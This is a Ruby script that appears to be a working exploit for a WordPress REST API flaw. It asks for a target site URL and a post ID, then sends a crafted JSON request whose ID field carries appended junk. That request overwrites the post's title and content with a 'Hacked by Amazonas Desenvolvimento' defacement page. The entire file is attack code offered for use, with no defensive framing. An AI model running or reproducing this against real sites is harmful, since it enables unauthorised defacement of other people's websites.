# usage : gem install rest-client

require 'rest-client'
require 'json'

puts "Enter the wordpress target url (With wp directory)"
targetUri = gets.chomp
puts "Enter Post ID"
postId = gets.chomp.to_i

response = RestClient.post(
   "#{targetUri}/index.php/wp-json/wp/v2/posts/#{postId}",
   {
      "id" => "#{postId}justrawdata",
      "title" => "Hacked by Amazonas Desenvolvimento",
      "content" => "<center><h1>Hacked by Amazonas Desenvolvimento</h1><br><pre>$ Nothing is impossible in the cyber world $</pre></center>",
   }.to_json,
   :content_type => :json,
   :accept => :json
) { |response, request, result| response }

if(response.code == 200)
   puts = "Done! '#{targetUri}/index.php?p=#{postId}'"

else
   puts "This site is not vulnerable to this exploit"
end